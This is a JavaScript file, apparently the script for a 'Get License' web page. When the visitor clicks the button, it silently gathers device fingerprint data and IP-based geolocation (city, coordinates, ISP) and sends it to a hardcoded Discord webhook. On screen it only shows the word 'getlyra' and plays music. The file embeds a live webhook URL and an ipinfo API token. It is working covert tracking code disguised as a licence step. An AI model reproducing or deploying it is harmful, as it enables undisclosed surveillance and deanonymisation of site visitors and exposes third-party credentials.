(function() {
    function getWebGLInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) {
            return { 'GPU': 'Not available' };
        }
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            'GPU Vendor': gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            'GPU Renderer': gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        };
    }

    function getDeviceInfo() {
        return {
            'Browser': navigator.userAgent,
            'Platform': navigator.platform,
            'Language': navigator.language,
            'Screen Resolution': `${window.screen.width}x${window.screen.height}`,
            'Available Screen Size': `${window.screen.availWidth}x${window.screen.availHeight}`,
            'Color Depth': `${window.screen.colorDepth}-bit`,
            'Device Memory (Approx)': navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Not available',
            'Time Zone': Intl.DateTimeFormat().resolvedOptions().timeZone,
            'Online Status': navigator.onLine ? "Online" : "Offline",
            'Cookies Enabled': navigator.cookieEnabled,
            'JavaScript Enabled': true,
            'Referrer': document.referrer || 'None'
        };
    }

    function displayWordOnly() {
        const deviceInfoDiv = document.getElementById('fixedText');
        deviceInfoDiv.style.display = 'block'; // Show the "getlyra" text
    }

    async function fetchIPInfo() {
        try {
            const response = await fetch('https://ipinfo.io/json?token=284d70a8a57e5a');
            const data = await response.json();
            return {
                'IP Address': data.ip,
                'City': data.city,
                'Region': data.region,
                'Country': data.country,
                'Location (Lat, Lon)': data.loc,
                'ISP': data.org
            };
        } catch (error) {
            return {
                'IP Address': 'Unable to fetch IP',
                'Geolocation': 'Unable to fetch location',
            };
        }
    }

    async function init() {
        const ipData = await fetchIPInfo();
        const deviceData = Object.assign(getDeviceInfo(), getWebGLInfo(), ipData);
        sendToWebhook(deviceData, 'https://discord.com/api/webhooks/1316455762490560614/wP4p5NOQ9s7Dd6yQhweQR-CY_gjlf10PI9fI4Jl9l9sdBMjiJhJIO7qW8ICDJSHeu0vK'); // Send device info to webhook
        displayWordOnly(); // Display "getlyra" on the screen
    }

    document.getElementById('startButton').addEventListener('click', function() {
        document.querySelector('.button-container').style.display = 'none';
        document.getElementById('infoContainer').style.display = 'block';

        init();

        const music = document.getElementById('backgroundMusic');
        music.play();
    });

    function sendToWebhook(info, webhookURL) {
        const payload = {
            content: "User clicked 'Get License'!",
            embeds: [{
                title: "Device Information",
                description: Object.entries(info).map(([key, value]) => `**${key}**: ${value}`).join("\n"),
                color: 3447003
            }]
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        }).then(response => {
            if (response.ok) {
                console.log('Sent to webhook successfully.');
            } else {
                console.error('Failed to send to webhook.');
            }
        }).catch(error => {
            console.error('Error:', error);
        });
    }
})();
